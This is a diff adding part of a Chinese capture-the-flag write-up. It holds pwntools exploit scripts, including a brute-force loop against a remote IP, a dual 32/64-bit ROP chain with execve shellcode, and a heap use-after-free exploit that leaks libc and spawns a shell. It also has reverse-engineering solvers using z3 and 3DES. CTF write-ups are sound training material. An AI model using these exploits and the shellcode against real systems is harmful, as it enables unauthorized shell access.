+def random_aslr(n):
+    r = ''.join(random.choice('abcdef'+string.digits) for _ in xrange(3))
+    ri = int(hex(n)[2:4]+r+hex(n)[-3:], 16)
+    return int(hex(n)[2:4]+r+hex(n)[-3:], 16)
+
+def fuck():
+    while True:
+        io = remote('49.4.30.253', 31337)
+        # io = remote('127.0.0.1', 5002)
+        io.send(pow(io))
+        # io.sendline(gen(random_aslr(0xf7dec000+0x3cd10)))
+        # io.sendline(gen(0xf7e29200))
+        io.sendline(gen(0xf7dec000+0x3cd10))
+        buf = io.recvall()
+        print buf
+        if '{' in buf or 'flag' in buf:
+            print buf
+            raw_input()
+        io.close()
+
+if __name__ == '__main__':
+    p_list = []
+    for ip in range(10):
+        p = Process(target=fuck)
+        p.start()
+        p_list.append(p)
+        time.sleep(1)
+    for res in p_list:
+        res.join()
+```
+### babymimic
+ret2syscall的拟态版本，通过add sp，把32和64区分开，然后分别rop一下，具体看exp。其中遇到几个问题：
+
++ 最开始32和64位都是用syscall做的，32位可以成功，64位syscall执行不了不知道为什么。最后把64位换成用mprotect去增加可执行权限后ret2shellcode
++ 要让32和64位程序执行后你要recv的东西一致才行，因为程序ret前puts了一下，这里要填点东西，然后\x00截断一下
++ flag拿到后还有个异或操作，就很简单了
+
+
+![](https://p.pstatp.com/origin/ff1e000047ec450602b9)
+
+```
+#-*- coding: utf-8 -*-
+from pwn import *
+from hashlib import sha256
+
+__author__ = '3summer'
+s       = lambda data               :io.send(str(data)) 
+sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
+sl      = lambda data               :io.sendline(str(data))
+sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+irt     = lambda                    :io.interactive()
+uu32    = lambda data               :u32(data.ljust(4, '\0'))
+uu64    = lambda data               :u64(data.ljust(8, '\0'))
+
+context.terminal = ['tmux', 'sp', '-h', '-l', '110']
+context.log_level = 'debug'
+token = 'bfdccbebf86687951f6d37b3e5a35fe1'
+
+def dbg(breakpoint):
+    gdbscript = ''
+    elf_base = 0
+    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
+    gdbscript += 'c\n'
+    log.info(gdbscript)
+    gdb.attach(io, gdbscript)
+    time.sleep(1)
+
+def pow():
+    ru('.hexdigest()=')
+    sha_256 = ru('\n')
+    ru(".encode('hex')=")
+    half = ru('\n').decode('hex')
+    dic = [chr(i) for i in range(0x100)]
+    ans = iters.mbruteforce(lambda x: sha256(half + x).hexdigest()==sha_256, dic, 3, 'fixed')
+    sla("skr.encode('hex')=", (half+ans).encode('hex'))
+    sla(':', token)
+
+def exploit(io):
+    print ru('it?\n')
+
+    # 64位
+    # dbg(0x400B33)
+    int_0x80_x64 = 0x000000000044e82c
+    pop_rax = 0x000000000043b97c
+    pop_rdx = 0x000000000043b9d5
+    pop_rdi = 0x00000000004005f6 
+    pop_rsi = 0x0000000000405895
+    read_plt = 0x43B9C0
+    add_rsp = 0x00000000004079d4 # add rsp, 0xd8 ; ret
+
+    # 32位
+    # dbg(0x804892F)
+    int_0x80_x86 = 0x080495a3
+    add_esp = 0x0804f095 # add esp, 0x1c ; ret
+    read_plt_32 = 0x0806C8E0
+    pop_3_ret = 0x08055f54 # pop eax ; pop edx ; pop ebx ; ret
+    pop_ecx = 0x0806e9f2 # pop ecx ; pop ebx ; ret
+
+    rop_32 = p32(read_plt_32) + p32(pop_3_ret) + p32(0) + p32(0x80d7000) + p32(0x100) + p32(pop_ecx) + p32(0) + p32(0) + p32(pop_3_ret) + p32(0xb) + p32(0) + p32(0x80d7000) + p32(int_0x80_x86)
+    # rop_64 = p64(read_plt) + p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(0x6a13e3) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(int_0x80_x64)
+    rop_64 = p64(read_plt) + p64(pop_rdi) + p64(0x69e000) + p64(pop_rsi) + p64(0x6000) + p64(pop_rdx) + p64(7) + p64(0x43C7A0) + p64(0x6a13e3+8)
+    payload = 'test'+'\x00'*0x108 + 'b'*4 + p32(add_esp) + 'c'*4 + p64(add_rsp) + 'd'*0x10 + rop_32.ljust(0xc8,'e') + rop_64
+    #                                32_ret                  64_ret                   32_rop(0xc8)             64_rop
+    s(payload)
+    sa('test\n','/bin/sh\x00'+'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05')
+    return io
+
+
+if __name__ == '__main__':
+    if len(sys.argv) > 2:
+        io = remote(sys.argv[1], sys.argv[2])
+        pow()
+    else:
+        io = process(sys.argv[1], 0)
+    exploit(io)
+    irt()
+```
+### random
+可以分为两种chunk，暂且把calloc的成为func_chunk，malloc的成为data_chunk。
+
+首先在输入name的时候可以带个地址出来，算到pie的基址。然后days和times姑且就输入最大的35和10。然后来看他的func_chunk的4个功能，分别是增，改，删，查，4个函数指针存放func_chunk上，在sub_10DB时调用，他的调用是这样的
+```
+free(ptr);
+v5(ptr);
+```
+很明显存在一点问题，但是又感觉太抽象了。同时注意到add后会问你是否需要再add一个func_chunk。
+
+因为堆上存在函数指针，所以思路应该是和UAF例题类似的看能不能覆盖这个指针，那么如果控制data_chunk和func_chunk大小一样大，应该哪里会造成点错误出来。
+
+开始尝试add，但是我们一轮有10个func_chunk加上随机性，所以add一次然后gdb断下去看下堆。这样重复下去，当我add完第3个的时候发现第3个堆的开始地方居然被写了一个堆指针。仔细研究后发现，bss上的0x203168作为func_chunk的头节点，使用单向链表链接起来。那么可以通过编辑第3个data_chunk，我们能控制：
+
++ func_chunk的这个单向链表
++ 修改func_chunk的函数指针，通过call rdx可以劫持执行流
+
+后面就是要泄漏libc了，因为限制了chunk大小，全是fast泄漏不了libc，所以构造一个0x91的堆头去free，然后打印出来就能拿到libc，接着就是call rdx执行one_gadget。由于程序逻辑有点绕，调试过程十分虐心。脚本如下：
+
+```
+#-*- coding: utf-8 -*-
+from pwn import *
+
+
+__author__ = '3summer'
+s       = lambda data               :io.send(str(data)) 
+sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
+sl      = lambda data               :io.sendline(str(data))
+sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
+r       = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+irt     = lambda                    :io.interactive()
+uu32    = lambda data               :u32(data.ljust(4, '\0'))
+uu64    = lambda data               :u64(data.ljust(8, '\0'))
+
+binary_file = './random'
+context.binary = binary_file
+context.terminal = ['tmux', 'sp', '-h', '-l', '110']
+context.log_level = 'debug'
+elf = ELF(binary_file)
+libc = elf.libc
+one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+libc.symbols['one_gadget'] = one_gadgets[0]
+cnt = 10
+
+def dbg(breakpoint):
+    glibc_dir = '/usr/src/glibc/glibc-2.23/'
+    gdbscript = 'directory %smalloc\n' % glibc_dir
+    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
+    gdbscript += 'directory %sstdlib/\n' % glibc_dir
+    gdbscript += 'directory %slibio\n' % glibc_dir
+    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0
+    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
+    gdbscript += 'c\nvis_heap_chunks 0x555555758000 20\ndqs 0x555555554000+0x203168\ndq 0x555555554000+0x203180 30'
+    log.info(gdbscript)
+    gdb.attach(io, gdbscript)
+    time.sleep(1)
+
+def choice(cmd, *argv):
+    global cnt
+    while True:
+        v = ru('\n')
+        if '(Y/N)' in v:
+            if cmd in v:
+                sl('Y')
+                break
+            else:
+                sl('N')
+        elif '(0~10)' in v:
+            sl(cnt)
+        else:
+            pass
+    for i in argv:
+        if isinstance(i,tuple):
+            sla(i[0],i[1])
+            continue
+        sla(':',i)
+add     = lambda size,content,bol   :choice('add',size,content,('(Y/N)',bol))
+edit    = lambda idx,content        :choice('update',idx,content)
+show    = lambda idx                :choice('view',idx)
+delete  = lambda idx                :choice('delete',idx)
+
+
+def exploit(io):
+    global cnt
+    # dbg(0x176B) # strdup
+    # dbg(0x0177F) # srand
+    # dbg(0x11BA) # call func_ptr
+    # dbg(0x1425) # add_done
+    # dbg(0x159B) # free
+    # dbg(0x0150B) # edit_done
+    # dbg(0x13F2) # add_2
+    # dbg(0x134D) # malloc
+    # dbg(0x14E2) # edit_read
+    # dbg(0x11AC) # free_call
+    # dbg(0x13B3) # add_read
+
+    sa('name:', 'a'*0x8)
+    ru('a'*8)
+    elf.address = uu64(r(6))-0xb90
+    success('elf = 0x%x' % elf.address)
+    sla('?\n', 35)
+
+    add(0x3f,'0'*0x10,'Y')
+    add(0x3f,'1'*0x10,'Y')
+    add(0x17,'2'*0x10,'Y')
+    show(2)
+    ru('\n')
+    heap_base = uu64(ru('\n'))-0xb0
+    success('heap = 0x%x' % heap_base)
+    edit(2, flat(heap_base+0x1b0, elf.address+0x1427, p8(2)))
+    edit(0, flat(heap_base+0x1b0, elf.address+0x1600, 2, 0x91, heap_base+0x190, elf.address+0x129E, 2))
+    add(0x3f, flat(heap_base+0x250, elf.address+0x1427, 2), 'N')
+    show(2)
+    ru('\n')
+    unsorted_bin = uu64(r(6))
+    libc.address = unsorted_bin-libc.sym['__malloc_hook']-88-0x10
+    success('libc = 0x%x' % libc.address)
+    edit(1, flat('1'*0x8, 0x41, '/bin/sh\x00', libc.sym.one_gadget, 2))
+
+
+    return io
+
+
+if __name__ == '__main__':
+    if len(sys.argv) > 1:
+        io = remote(sys.argv[1], sys.argv[2])
+    else:
+        io = process(binary_file, 0)
+        # io = process(binary_file, env={"LD_PRELOAD":"./libc-2.23.so"})
+    exploit(io)
+    irt()
+```
+
 ## RE
+
+### JustRe
+第一部分：
+
+![](https://p.pstatp.com/origin/fe7b000075a50006aa5b)
+
+两端执行相同操作，看其中一个即可。
+
+```
+from z3 import *
+
+base_data = [0x78B09135,0xE78DBAE5,0xFB0C084A, 0x3B5C0EA2,0x82C7F904,0xF937EE81,0xEB130A06,0x3B4D7202,0x3ACC6A08,0x045A0A49, 0x26E84E1B,0x5513B95C, 0x3B4D8209,0xAD132C0D,  0x044BEE4A,0x61164B1F]
+
+base_data = [0x79B19266,  0x0E88EBBB6,  0x0FC0D093B, 0x3C5D0F73,  0x83C8FA15,      0x0FA38EF92,  0x0EC140B17, 0x3C4E7313, 0x3BCD6B19,  0x55B0B5A,0x27E94F0C,0x5614BA4D,0x3C4E831A,0x0AE142D1E, 0x54CEF5B,    0x62174C10]
+
+func_data = [0x83EC8B55,0xEC81F0E4,0x00000278,0x405004A1,0x89C43300,0x02742484,0x100F0000,0x4041A805,0x41C0A000,0x0F560040,0x2C244411,0x7E0FF357,0x4041B805,0xD60F6600,0x0F402444,0x6A0A4110]
+
+
+f1 = BitVec('f1', 4*8)
+f2 = BitVec('f2', 4*8)
+
+# f1 = Int("f1")
+# f2 = Int("f2")
+
+solver = Solver()
+
+for i in range(16):
+
+    solver.add(func_data[i] == ((f1 + i) ^ ((0x1010101 * f2) + base_data[i])))   
+
+s = solver.check()
+m = solver.model()
+
+print hex(int(str(m[f1])))[2:], hex(int(str(m[f2])))[2:]
+
+# 13242218 18
+```
+
+第二部分
+密钥为 "AFSAFCEDYCXCXACNDFKDCQXC" 的3des算法。直接算即可
+
+![](https://p.pstatp.com/origin/fef3000067882577398f)
+
+```
+from Crypto.Cipher import DES3
+import base64
+
+BS = DES3.block_size
+
+
+def pad(s):
+    return s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
+
+
+def unpad(s):
+    return s[0:-ord(s[-1])]
+
+
+class prpcrypt():
+    def __init__(self, key):
+        self.key = key
+        self.mode = DES3.MODE_ECB
+
+    def encrypt(self, text):
+        text = pad(text)
+        cryptor = DES3.new(self.key, self.mode)
+        x = len(text) % 8
+        if x != 0:
+            text = text + '\0' * (8 - x)
+        # print(text)
+        self.ciphertext = cryptor.encrypt(text)
+        return (self.ciphertext).encode("hex")
+
+    def decrypt(self, text):
+        cryptor = DES3.new(self.key, self.mode)
+        # de_text = base64.standard_b64decode(text)
+        plain_text = cryptor.decrypt(text)
+        st = str(plain_text.decode("utf-8")).rstrip('\0')
+        print st.encode("hex")
+        print st
+        out = unpad(st)
+        return out
+
+# 507CA9E68709CEFA20D50DCF90BB976C  #9090F6B07BA6A4E8
+
+cipher = "507CA9E68709CEFA20D50DCF90BB976C".decode("hex")
+
+p = prpcrypt("AFSAFCEDYCXCXACNDFKDCQXC")
+
+print p.decrypt(cipher)
+```
 
 ### 强网先锋_AD
 
